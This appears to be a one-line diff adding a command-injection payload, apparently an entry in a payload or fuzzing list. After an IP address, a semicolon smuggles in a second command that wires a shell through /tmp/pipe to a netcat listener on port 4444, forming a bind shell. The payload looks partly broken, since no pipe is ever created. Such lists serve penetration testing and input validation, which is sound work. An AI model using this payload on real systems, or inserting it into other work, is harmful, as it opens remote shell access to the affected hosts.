@@ -1,0 +1,1 @@
+192.168.0.1; /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
